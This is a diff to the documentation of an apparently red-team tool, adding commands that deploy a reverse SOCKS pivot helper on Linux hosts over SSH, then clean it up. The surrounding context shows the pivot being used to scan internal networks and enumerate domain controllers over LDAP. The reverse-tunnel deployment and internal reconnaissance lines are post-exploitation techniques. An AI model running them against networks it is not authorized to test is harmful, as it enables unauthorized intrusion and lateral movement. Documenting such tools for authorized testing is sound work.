@@ -456,10 +456,26 @@ Use `nimux socks` to deploy a background pivot helper, then reuse `nimux` with `
 nimux socks <pivot-host> -u <admin> -p '<password>' -d <domain> \
   --reverse --listener <operator-ip> --socks-port 1080 --control-port 1081
 
+nimux socks <pivot-host> --linux -u <user> -p '<password>' \
+  --reverse --listener <operator-ip> --socks-port 1080 --control-port 1081
+
+nimux socks <pivot-host> --linux -u <user> --ssh-key ~/.ssh/id_rsa \
+  --reverse --listener <operator-ip> --socks-port 1080 --control-port 1081
+
 nimux scan <internal-cidr> --port 445,389,5985 --open --proxy socks5://127.0.0.1:1080 --json
 
 nimux ldap <internal-dc> -u <user> -p '<password>' -d <domain> \
   --proxy socks5://127.0.0.1:1080 --query dcs --query trusts --json
+```
+
+Linux notes:
+
+```text
+use --linux for SSH-backed pivots
+Linux deployment currently requires --reverse and --listener
+authenticate with --password or --ssh-key
+record pid and remote_helper_path for cleanup
+Windows pivots also print socks_task
 ```
 
 Cleanup:
@@ -467,6 +483,12 @@ Cleanup:
 ```bash
 nimux socks <pivot-host> -u <admin> -p '<password>' -d <domain> \
   --kill --pid <pid> --socks-task <task-name> --remote <remote-helper-path>
+
+nimux socks <pivot-host> --linux -u <user> -p '<password>' \
+  --kill --pid <pid> --remote <remote-helper-path>
+
+nimux socks <pivot-host> --linux -u <user> --ssh-key ~/.ssh/id_rsa \
+  --kill --pid <pid> --remote <remote-helper-path>
 ```
 
 Record:
@@ -608,6 +630,16 @@ nimux socks <pivot-host> -u <admin> -p '<password>' -d <domain> \
   --reverse --listener <operator-ip> --socks-port 1080 --control-port 1081
 ```
 
+Native Linux pivot deployment:
+
+```bash
+nimux socks <pivot-host> --linux -u <user> -p '<password>' \
+  --reverse --listener <operator-ip> --socks-port 1080 --control-port 1081
+
+nimux socks <pivot-host> --linux -u <user> --ssh-key ~/.ssh/id_rsa \
+  --reverse --listener <operator-ip> --socks-port 1080 --control-port 1081
+```
+
 Native pivot deployment with Kerberos:
 
 ```bash
@@ -633,6 +665,9 @@ Pivot cleanup:
 ```bash
 nimux socks <pivot-host> -u <admin> -p '<password>' -d <domain> \
   --kill --pid <pid> --socks-task <task-name> --remote <remote-helper-path>
+
+nimux socks <pivot-host> --linux -u <user> -p '<password>' \
+  --kill --pid <pid> --remote <remote-helper-path>
 ```
 
 GPO write preview:
